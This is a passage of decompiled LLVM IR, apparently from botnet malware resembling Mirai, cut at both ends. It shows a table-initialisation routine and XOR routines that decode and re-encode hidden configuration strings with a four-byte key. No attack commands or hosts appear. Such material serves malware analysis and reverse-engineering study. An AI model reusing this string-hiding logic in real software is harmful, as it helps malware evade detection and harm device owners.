  uselistorder i32 ()* @rand_next, { 74, 71, 70, 69, 68, 67, 66, 72, 65, 64, 63, 73, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 4, 3, 2, 1, 0, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 8, 7, 6, 5, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_24d6c.154, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_24d68.152, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_22284.140, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_24d4c.56, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_24d4c.56 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10280, { 1, 0 }
  uselistorder label %dec_label_pc_f4bc.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f4bc.backedge.thread565, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_f4bc.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10234, { 1, 0 }
  uselistorder label %dec_label_pc_10194, { 1, 0 }
  uselistorder label %dec_label_pc_ff90, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_ff58, { 1, 0 }
  uselistorder label %dec_label_pc_ff44, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ff34, { 1, 0 }
  uselistorder label %dec_label_pc_fe24, { 1, 0 }
  uselistorder label %dec_label_pc_fd58, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fd40, { 1, 0 }
  uselistorder label %dec_label_pc_fc54, { 1, 0 }
  uselistorder label %dec_label_pc_fb98, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fb80, { 1, 0 }
  uselistorder label %dec_label_pc_fa48, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fa30, { 1, 0 }
  uselistorder label %dec_label_pc_f974, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f95c, { 1, 0 }
  uselistorder label %dec_label_pc_f8e8, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread102, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f8b4, { 1, 0 }
  uselistorder label %.thread98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f894, { 1, 0 }
  uselistorder label %dec_label_pc_f880, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f83c, { 1, 0 }
  uselistorder label %dec_label_pc_f83c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f7d0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f7b8, { 1, 0 }
  uselistorder label %dec_label_pc_f72c, { 6, 7, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_f724, { 4, 2, 5, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_f70c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f5c8, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb425, { 1, 0 }
  uselistorder label %bb423, { 1, 0 }
  uselistorder label %dec_label_pc_f590, { 1, 0 }
  uselistorder label %dec_label_pc_f524, { 1, 0 }
  uselistorder label %.thread81, { 1, 0 }
  uselistorder label %dec_label_pc_f4d4, { 1, 0 }
  uselistorder label %dec_label_pc_f4c4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f4c4.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f4b8.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f4a0, { 1, 0 }
  uselistorder label %bb419, { 1, 0 }
  uselistorder label %dec_label_pc_f3c4, { 1, 0 }
  uselistorder label %bb417, { 1, 0 }
  uselistorder label %bb415, { 1, 0 }
  uselistorder label %bb413, { 1, 0 }
  uselistorder label %bb411, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_f2b8.dec_label_pc_f2b8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f294.dec_label_pc_f294_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f288, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_f270, { 1, 0 }
  uselistorder label %dec_label_pc_f24c, { 1, 0 }
  uselistorder label %dec_label_pc_f0fc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_f0e8, { 1, 0 }
  uselistorder label %bb408, { 1, 0 }
  uselistorder label %dec_label_pc_ef7c, { 1, 0 }
  uselistorder label %dec_label_pc_ef70, { 1, 0 }
  uselistorder label %dec_label_pc_ef64, { 1, 0 }
  uselistorder label %dec_label_pc_ef58, { 1, 0 }
  uselistorder label %dec_label_pc_ef4c, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 0 }
  uselistorder label %dec_label_pc_ef24, { 1, 0 }
  uselistorder label %dec_label_pc_ef10, { 1, 0 }
  uselistorder label %dec_label_pc_eef0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_eecc, { 1, 0 }
  uselistorder label %dec_label_pc_eec0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee9c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ee78, { 1, 0 }
  uselistorder label %bb375, { 1, 0 }
  uselistorder label %dec_label_pc_ee24, { 30, 6, 29, 2, 10, 3, 11, 4, 12, 5, 13, 0, 14, 15, 16, 17, 7, 8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 31 }
  uselistorder label %dec_label_pc_ec14, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_24d78.217 to i32), i32* @r2, align 4
  %v3_1028c = mul i32 %arg1, 8
  %v2_10290 = add i32 %v3_1028c, ptrtoint (i32* @global_var_24d78.217 to i32)
  store i32 %v2_10290, i32* @r3, align 4
  %v2_10294 = icmp eq i32* %arg2, null
  br i1 %v2_10294, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_1029c4 = inttoptr i32 %v2_10290 to i32*
  %v4_1029c5 = load i32, i32* %v3_1029c4, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_10298 = add i32 %v3_1028c, add (i32 ptrtoint (i32* @global_var_24d78.217 to i32), i32 4)
  %v3_10298 = inttoptr i32 %v2_10298 to i16*
  %v4_10298 = load i16, i16* %v3_10298, align 4
  %v5_10298 = zext i16 %v4_10298 to i32
  store i32 %v5_10298, i32* @r3, align 4
  %v3_1029c = inttoptr i32 %v2_10290 to i32*
  %v4_1029c = load i32, i32* %v3_1029c, align 4
  store i32 %v5_10298, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_1029c6 = phi i32 [ %v4_1029c5, %.thread ], [ %v4_1029c, %bb ]
  ret i32 %v4_1029c6

; uselistorder directives
  uselistorder i32 %v2_10290, { 1, 0, 2 }
  uselistorder i32 %v3_1028c, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_102b4 = mul i32 %arg1, 8
  %v2_102b8 = add i32 %v3_102b4, ptrtoint (i32* @global_var_24d78.217 to i32)
  %v2_102bc = load i32, i32* @global_var_220c8.220, align 4
  store i32 %v2_102bc, i32* @r1, align 4
  %v1_102c0 = add i32 %v3_102b4, add (i32 ptrtoint (i32* @global_var_24d78.217 to i32), i32 4)
  %v2_102c0 = inttoptr i32 %v1_102c0 to i16*
  %v3_102c0 = load i16, i16* %v2_102c0, align 4
  %v3_102c4 = udiv i32 %v2_102bc, 256
  %v2_102c8 = icmp eq i16 %v3_102c0, 0
  store i1 %v2_102c8, i1* @cpsr_z, align 1
  %v3_102cc = udiv i32 %v2_102bc, 65536
  store i32 %v3_102cc, i32* @r3, align 4
  %v3_102d0 = load i32, i32* @r4, align 4
  store i32 %v3_102d0, i32* %stack_var_-16, align 4
  %v1_102d4 = urem i32 %v3_102c4, 256
  store i32 %v1_102d4, i32* %r6.global-to-local, align 4
  %v1_102d8 = urem i32 %v3_102cc, 256
  store i32 %v1_102d8, i32* %r5.global-to-local, align 4
  %v3_102dc = udiv i32 %v2_102bc, 16777216
  store i32 %v3_102dc, i32* %r4.global-to-local, align 4
  %v1_102e0 = urem i32 %v2_102bc, 256
  store i32 %v1_102e0, i32* %lr.global-to-local, align 4
  br i1 %v2_102c8, label %dec_label_pc_1033c, label %dec_label_pc_102e8

dec_label_pc_102e8:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_102ec = inttoptr i32 %v2_102b8 to i32*
  br label %dec_label_pc_102ec

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102ec.dec_label_pc_102ec_crit_edge, %dec_label_pc_102e8
  %v0_102f4 = phi i32 [ %v0_102f4.pre, %dec_label_pc_102ec.dec_label_pc_102ec_crit_edge ], [ %v1_102e0, %dec_label_pc_102e8 ]
  %v2_102f8 = phi i32 [ %v1_10330, %dec_label_pc_102ec.dec_label_pc_102ec_crit_edge ], [ 0, %dec_label_pc_102e8 ]
  %v2_102ec = load i32, i32* %v1_102ec, align 4
  %v2_102f0 = add i32 %v2_102ec, %v2_102f8
  %v3_102f0 = inttoptr i32 %v2_102f0 to i8*
  %v4_102f0 = load i8, i8* %v3_102f0, align 1
  %v6_102f0 = zext i8 %v4_102f0 to i32
  %v2_102f4 = xor i32 %v6_102f0, %v0_102f4
  %v1_102f8 = trunc i32 %v2_102f4 to i8
  store i8 %v1_102f8, i8* %v3_102f0, align 1
  %v2_102fc = load i32, i32* %v1_102ec, align 4
  %v0_10300 = load i32, i32* @ip, align 4
  %v2_10300 = add i32 %v0_10300, %v2_102fc
  %v3_10300 = inttoptr i32 %v2_10300 to i8*
  %v4_10300 = load i8, i8* %v3_10300, align 1
  %v6_10300 = zext i8 %v4_10300 to i32
  %v0_10304 = load i32, i32* %r6.global-to-local, align 4
  %v2_10304 = xor i32 %v0_10304, %v6_10300
  %v1_10308 = trunc i32 %v2_10304 to i8
  store i8 %v1_10308, i8* %v3_10300, align 1
  %v2_1030c = load i32, i32* %v1_102ec, align 4
  %v0_10310 = load i32, i32* @ip, align 4
  %v2_10310 = add i32 %v0_10310, %v2_1030c
  %v3_10310 = inttoptr i32 %v2_10310 to i8*
  %v4_10310 = load i8, i8* %v3_10310, align 1
  %v6_10310 = zext i8 %v4_10310 to i32
  %v0_10314 = load i32, i32* %r5.global-to-local, align 4
  %v2_10314 = xor i32 %v0_10314, %v6_10310
  %v1_10318 = trunc i32 %v2_10314 to i8
  store i8 %v1_10318, i8* %v3_10310, align 1
  %v2_1031c = load i32, i32* %v1_102ec, align 4
  store i32 %v2_1031c, i32* @r1, align 4
  %v0_10320 = load i32, i32* @ip, align 4
  %v2_10320 = add i32 %v0_10320, %v2_1031c
  %v3_10320 = inttoptr i32 %v2_10320 to i8*
  %v4_10320 = load i8, i8* %v3_10320, align 1
  %v6_10320 = zext i8 %v4_10320 to i32
  %v0_10324 = load i32, i32* %r4.global-to-local, align 4
  %v2_10324 = xor i32 %v0_10324, %v6_10320
  store i32 %v2_10324, i32* @r3, align 4
  %v1_10328 = trunc i32 %v2_10324 to i8
  store i8 %v1_10328, i8* %v3_10320, align 1
  %v3_1032c = load i16, i16* %v2_102c0, align 4
  %v4_1032c = zext i16 %v3_1032c to i32
  %v0_10330 = load i32, i32* @ip, align 4
  %v1_10330 = add i32 %v0_10330, 1
  store i32 %v1_10330, i32* @ip, align 4
  %v9_10334 = icmp eq i32 %v4_1032c, %v1_10330
  store i1 %v9_10334, i1* @cpsr_z, align 1
  %v8_10338 = icmp sgt i32 %v4_1032c, %v1_10330
  br i1 %v8_10338, label %dec_label_pc_102ec.dec_label_pc_102ec_crit_edge, label %dec_label_pc_1033c.loopexit

dec_label_pc_102ec.dec_label_pc_102ec_crit_edge:  ; preds = %dec_label_pc_102ec
  %v0_102f4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_102ec

dec_label_pc_1033c.loopexit:                      ; preds = %dec_label_pc_102ec
  %v2_1033c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1033c

dec_label_pc_1033c:                               ; preds = %dec_label_pc_1033c.loopexit, %entry
  %v2_1033c = phi i32 [ %v2_1033c.pre, %dec_label_pc_1033c.loopexit ], [ %v3_102d0, %entry ]
  store i32 %v2_1033c, i32* @r4, align 4
  ret i32 %v2_102b8

; uselistorder directives
  uselistorder i32 %v1_10330, { 1, 2, 3, 0 }
  uselistorder i32 %v1_102e0, { 1, 0 }
  uselistorder i32 %v3_102cc, { 1, 0 }
  uselistorder i32 %v2_102bc, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_102b8, { 1, 0 }
  uselistorder i32 %v3_102b4, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10354 = mul i32 %arg1, 8
  %v2_10358 = add i32 %v3_10354, ptrtoint (i32* @global_var_24d78.217 to i32)
  %v2_1035c = load i32, i32* @global_var_220c8.220, align 4
  %v1_10360 = add i32 %v3_10354, add (i32 ptrtoint (i32* @global_var_24d78.217 to i32), i32 4)
  %v2_10360 = inttoptr i32 %v1_10360 to i16*
  %v3_10360 = load i16, i16* %v2_10360, align 4
  %v3_10364 = udiv i32 %v2_1035c, 256
  %v2_10368 = icmp eq i16 %v3_10360, 0
  %v3_1036c = udiv i32 %v2_1035c, 65536
  %v3_10370 = load i32, i32* @r4, align 4
  store i32 %v3_10370, i32* %stack_var_-16, align 4
  %v1_10374 = urem i32 %v3_10364, 256
  store i32 %v1_10374, i32* %r6.global-to-local, align 4
  %v1_10378 = urem i32 %v3_1036c, 256
  store i32 %v1_10378, i32* %r5.global-to-local, align 4
  %v3_1037c = udiv i32 %v2_1035c, 16777216
  store i32 %v3_1037c, i32* %r4.global-to-local, align 4
  %v1_10380 = urem i32 %v2_1035c, 256
  store i32 %v1_10380, i32* %lr.global-to-local, align 4
  br i1 %v2_10368, label %dec_label_pc_103dc, label %dec_label_pc_10388

dec_label_pc_10388:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_1038c = inttoptr i32 %v2_10358 to i32*
  br label %dec_label_pc_1038c

dec_label_pc_1038c:                               ; preds = %dec_label_pc_1038c.dec_label_pc_1038c_crit_edge, %dec_label_pc_10388
  %v0_10394 = phi i32 [ %v0_10394.pre, %dec_label_pc_1038c.dec_label_pc_1038c_crit_edge ], [ %v1_10380, %dec_label_pc_10388 ]
  %v2_10398 = phi i32 [ %v1_103d0, %dec_label_pc_1038c.dec_label_pc_1038c_crit_edge ], [ 0, %dec_label_pc_10388 ]
  %v2_1038c = load i32, i32* %v1_1038c, align 4
  %v2_10390 = add i32 %v2_1038c, %v2_10398
  %v3_10390 = inttoptr i32 %v2_10390 to i8*
  %v4_10390 = load i8, i8* %v3_10390, align 1
  %v6_10390 = zext i8 %v4_10390 to i32
  %v2_10394 = xor i32 %v6_10390, %v0_10394
  %v1_10398 = trunc i32 %v2_10394 to i8
  store i8 %v1_10398, i8* %v3_10390, align 1
  %v2_1039c = load i32, i32* %v1_1038c, align 4
  %v0_103a0 = load i32, i32* @ip, align 4
  %v2_103a0 = add i32 %v0_103a0, %v2_1039c
  %v3_103a0 = inttoptr i32 %v2_103a0 to i8*
  %v4_103a0 = load i8, i8* %v3_103a0, align 1
  %v6_103a0 = zext i8 %v4_103a0 to i32
  %v0_103a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_103a4 = xor i32 %v0_103a4, %v6_103a0
  %v1_103a8 = trunc i32 %v2_103a4 to i8
  store i8 %v1_103a8, i8* %v3_103a0, align 1
  %v2_103ac = load i32, i32* %v1_1038c, align 4
  %v0_103b0 = load i32, i32* @ip, align 4
  %v2_103b0 = add i32 %v0_103b0, %v2_103ac
  %v3_103b0 = inttoptr i32 %v2_103b0 to i8*
  %v4_103b0 = load i8, i8* %v3_103b0, align 1
  %v6_103b0 = zext i8 %v4_103b0 to i32
  %v0_103b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_103b4 = xor i32 %v0_103b4, %v6_103b0
  %v1_103b8 = trunc i32 %v2_103b4 to i8
  store i8 %v1_103b8, i8* %v3_103b0, align 1
  %v2_103bc = load i32, i32* %v1_1038c, align 4
  %v0_103c0 = load i32, i32* @ip, align 4
  %v2_103c0 = add i32 %v0_103c0, %v2_103bc
  %v3_103c0 = inttoptr i32 %v2_103c0 to i8*
  %v4_103c0 = load i8, i8* %v3_103c0, align 1
  %v6_103c0 = zext i8 %v4_103c0 to i32
  %v0_103c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_103c4 = xor i32 %v0_103c4, %v6_103c0
  %v1_103c8 = trunc i32 %v2_103c4 to i8
  store i8 %v1_103c8, i8* %v3_103c0, align 1
  %v3_103cc = load i16, i16* %v2_10360, align 4
  %v4_103cc = zext i16 %v3_103cc to i32
  %v0_103d0 = load i32, i32* @ip, align 4
  %v1_103d0 = add i32 %v0_103d0, 1
  store i32 %v1_103d0, i32* @ip, align 4
  %v8_103d8 = icmp sgt i32 %v4_103cc, %v1_103d0
  br i1 %v8_103d8, label %dec_label_pc_1038c.dec_label_pc_1038c_crit_edge, label %dec_label_pc_103dc.loopexit

dec_label_pc_1038c.dec_label_pc_1038c_crit_edge:  ; preds = %dec_label_pc_1038c
  %v0_10394.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1038c

dec_label_pc_103dc.loopexit:                      ; preds = %dec_label_pc_1038c
  %v2_103dc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103dc.loopexit, %entry
  %v2_103dc = phi i32 [ %v2_103dc.pre, %dec_label_pc_103dc.loopexit ], [ %v3_10370, %entry ]
  store i32 %v2_103dc, i32* @r4, align 4
  ret i32 %v2_10358

; uselistorder directives
  uselistorder i32 %v1_103d0, { 1, 2, 0 }
  uselistorder i32 %v1_10380, { 1, 0 }
  uselistorder i32 %v2_1035c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10354, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_103ec = load i32, i32* @r4, align 4
  %v6_103ec = load i32, i32* @r5, align 4
  %v9_103ec = load i32, i32* @r6, align 4
  %v12_103ec = load i32, i32* @r7, align 4
  %v15_103ec = load i32, i32* @r8, align 4
  %v18_103ec = load i32, i32* @sb, align 4
  %v21_103ec = load i32, i32* @sl, align 4
  %v24_103ec = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_103f8 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24d78.217 to i32), i32* @r4, align 4
  store i32 %v0_103f8, i32* @r6, align 4
  %v4_10410 = call i32 @util_memcpy(i32 %v0_103f8, i32 ptrtoint ([3 x i8]* @global_var_197b8.225 to i32), i32 2)
  %v0_10414 = load i32, i32* @r5, align 4
  store i32 %v0_10414, i32* @r0, align 4
  %v0_10418 = load i32, i32* @r6, align 4
  store i32 %v0_10418, i32* @global_var_24d80.226, align 4
  %v1_1041c = trunc i32 %v0_10414 to i16
  store i16 %v1_1041c, i16* bitcast (i32* @global_var_24d84.227 to i16*), align 4
  %v0_10420 = call i32 @malloc()
  %v0_10424 = load i32, i32* @r5, align 4
  store i32 %v0_10420, i32* @r6, align 4
  %v3_10430 = call i32 @util_memcpy(i32 %v0_10420, i32 ptrtoint (i32* @global_var_197bc.229 to i32), i32 %v0_10424)
  store i32 29, i32* @r0, align 4
  %v0_10438 = load i32, i32* @r6, align 4
  store i32 %v0_10438, i32* @global_var_24d88.230, align 4
  %v0_1043c = load i32, i32* @r5, align 4
  %v1_1043c = trunc i32 %v0_1043c to i16
  store i16 %v1_1043c, i16* bitcast (i32* @global_var_24d8c.231 to i16*), align 4
  %v0_10440 = call i32 @malloc()
  store i32 %v0_10440, i32* @r5, align 4
  %v3_10450 = call i32 @util_memcpy(i32 %v0_10440, i32 ptrtoint (i32* @global_var_19924.233 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_24d94.234 to i16*), align 4
  %v0_10460 = load i32, i32* @r5, align 4
  store i32 %v0_10460, i32* @global_var_24d90.235, align 4
  %v0_10464 = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_10464, i32* @r5, align 4
  %v4_10478 = call i32 @util_memcpy(i32 %v0_10464, i32 ptrtoint ([7 x i8]* @global_var_197c0.237 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_10484 = load i32, i32* @r5, align 4
  store i32 %v0_10484, i32* @global_var_24d98.238, align 4
  %v0_10488 = load i32, i32* @sb, align 4
  %v1_10488 = trunc i32 %v0_10488 to i16
  store i16 %v1_10488, i16* bitcast (i32* @global_var_24d9c.239 to i16*), align 4
  %v0_1048c = call i32 @malloc()
  %v0_10494 = load i32, i32* @r7, align 4
  store i32 %v0_1048c, i32* @r5, align 4
  %v4_1049c = call i32 @util_memcpy(i32 %v0_1048c, i32 ptrtoint ([8 x i8]* @global_var_197c8.241 to i32), i32 %v0_10494)
  %v0_104a0 = load i32, i32* @r7, align 4
  store i32 %v0_104a0, i32* @r0, align 4
  %v0_104a4 = load i32, i32* @r5, align 4
  store i32 %v0_104a4, i32* @global_var_24da0.242, align 4
  %v1_104a8 = trunc i32 %v0_104a0 to i16
  store i16 %v1_104a8, i16* bitcast (i32* @global_var_24da4.243 to i16*), align 4
  %v0_104ac = call i32 @malloc()
  %v0_104b4 = load i32, i32* @r7, align 4
  store i32 %v0_104ac, i32* @r5, align 4
  %v4_104bc = call i32 @util_memcpy(i32 %v0_104ac, i32 ptrtoint ([8 x i8]* @global_var_197d0.245 to i32), i32 %v0_104b4)
  store i32 3, i32* @r0, align 4
  %v0_104c4 = load i32, i32* @r5, align 4
  store i32 %v0_104c4, i32* @global_var_24da8.246, align 4
  %v0_104c8 = load i32, i32* @r7, align 4
  %v1_104c8 = trunc i32 %v0_104c8 to i16
  store i16 %v1_104c8, i16* bitcast (i32* @global_var_24dac.247 to i16*), align 4
  %v0_104cc = call i32 @malloc()
  store i32 %v0_104cc, i32* @r5, align 4
  %v4_104dc = call i32 @util_memcpy(i32 %v0_104cc, i32 ptrtoint ([4 x i8]* @global_var_197d8.249 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_24db4.250 to i16*), align 4
  %v0_104ec = load i32, i32* @r5, align 4
  store i32 %v0_104ec, i32* @global_var_24db0.251, align 4
  %v0_104f0 = call i32 @malloc()
  store i32 %v0_104f0, i32* @r5, align 4
  %v3_10500 = call i32 @util_memcpy(i32 %v0_104f0, i32 ptrtoint (i32* @global_var_197dc.253 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24dbc.254 to i16*), align 4
  %v0_10510 = load i32, i32* @r5, align 4
  store i32 %v0_10510, i32* @global_var_24db8.255, align 4
  %v0_10514 = call i32 @malloc()
  store i32 %v0_10514, i32* @r5, align 4
  %v3_10524 = call i32 @util_memcpy(i32 %v0_10514, i32 ptrtoint (i32* @global_var_197f0.257 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_24dc4.258 to i16*), align 4
  %v0_10534 = load i32, i32* @r5, align 4
  store i32 %v0_10534, i32* @global_var_24dc0.259, align 4
  %v0_10538 = call i32 @malloc()
  store i32 %v0_10538, i32* @r5, align 4
  %v4_10548 = call i32 @util_memcpy(i32 %v0_10538, i32 ptrtoint ([10 x i8]* @global_var_1980c.261 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_24dcc.262 to i16*), align 4
  %v0_10558 = load i32, i32* @r5, align 4
  store i32 %v0_10558, i32* @global_var_24dc8.263, align 4
  %v0_1055c = call i32 @malloc()
  store i32 %v0_1055c, i32* @r5, align 4
  store i32 16, i32* @sl, align 4
  %v4_10570 = call i32 @util_memcpy(i32 %v0_1055c, i32 ptrtoint ([17 x i8]* @global_var_19818.265 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_10578 = load i32, i32* @r5, align 4
  store i32 %v0_10578, i32* @global_var_24dd0.266, align 4
  %v0_1057c = load i32, i32* @sl, align 4
  %v1_1057c = trunc i32 %v0_1057c to i16
  store i16 %v1_1057c, i16* bitcast (i32* @global_var_24dd4.267 to i16*), align 4
  %v0_10580 = call i32 @malloc()
  store i32 %v0_10580, i32* @r5, align 4
  %v4_10590 = call i32 @util_memcpy(i32 %v0_10580, i32 ptrtoint ([23 x i8]* @global_var_1982c.269 to i32), i32 22)
  %v0_10598 = load i32, i32* @r7, align 4
  store i32 %v0_10598, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_24ddc.270 to i16*), align 4
  %v0_105a0 = load i32, i32* @r5, align 4
  store i32 %v0_105a0, i32* @global_var_24dd8.271, align 4
  %v0_105a4 = call i32 @malloc()
  %v0_105ac = load i32, i32* @r7, align 4
  store i32 %v0_105a4, i32* @r5, align 4
  %v4_105b4 = call i32 @util_memcpy(i32 %v0_105a4, i32 ptrtoint ([8 x i8]* @global_var_19844.273 to i32), i32 %v0_105ac)
  store i32 5, i32* @r0, align 4
  %v0_105bc = load i32, i32* @r5, align 4
  store i32 %v0_105bc, i32* @global_var_24de0.274, align 4
  %v0_105c0 = load i32, i32* @r7, align 4
  %v1_105c0 = trunc i32 %v0_105c0 to i16
  store i16 %v1_105c0, i16* bitcast (i32* @global_var_24de4.275 to i16*), align 4
  %v0_105c4 = call i32 @malloc()
  store i32 %v0_105c4, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_105d8 = call i32 @util_memcpy(i32 %v0_105c4, i32 ptrtoint ([6 x i8]* @global_var_1984c.277 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_105e0 = load i32, i32* @r5, align 4
  store i32 %v0_105e0, i32* @global_var_24de8.278, align 4
  %v0_105e4 = load i32, i32* @fp, align 4
  %v1_105e4 = trunc i32 %v0_105e4 to i16
  store i16 %v1_105e4, i16* bitcast (i32* @global_var_24dec.279 to i16*), align 4
  %v0_105e8 = call i32 @malloc()
  store i32 %v0_105e8, i32* @r5, align 4
  %v4_105f8 = call i32 @util_memcpy(i32 %v0_105e8, i32 ptrtoint ([5 x i8]* @global_var_19854.281 to i32), i32 4)
  %v0_10600 = load i32, i32* @sb, align 4
  store i32 %v0_10600, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_24df4.282 to i16*), align 4
  %v0_10608 = load i32, i32* @r5, align 4
  store i32 %v0_10608, i32* @global_var_24df0.283, align 4
  %v0_1060c = call i32 @malloc()
  %v0_10614 = load i32, i32* @sb, align 4
  store i32 %v0_1060c, i32* @r5, align 4
  %v4_1061c = call i32 @util_memcpy(i32 %v0_1060c, i32 ptrtoint ([7 x i8]* @global_var_1985c.285 to i32), i32 %v0_10614)
  store i32 14, i32* @r0, align 4
  %v0_10624 = load i32, i32* @r5, align 4
  store i32 %v0_10624, i32* @global_var_24df8.286, align 4
  %v0_10628 = load i32, i32* @sb, align 4
  %v1_10628 = trunc i32 %v0_10628 to i16
  store i16 %v1_10628, i16* bitcast (i32* @global_var_24dfc.287 to i16*), align 4
  %v0_1062c = call i32 @malloc()
  store i32 %v0_1062c, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_10640 = call i32 @util_memcpy(i32 %v0_1062c, i32 ptrtoint ([15 x i8]* @global_var_19864.289 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_10648 = load i32, i32* @r5, align 4
  store i32 %v0_10648, i32* @global_var_24e00.290, align 4
  %v0_1064c = load i32, i32* @r8, align 4
  %v1_1064c = trunc i32 %v0_1064c to i16
  store i16 %v1_1064c, i16* bitcast (i32* @global_var_24e04.291 to i16*), align 4
  %v0_10650 = call i32 @malloc()
  store i32 8, i32* @r6, align 4
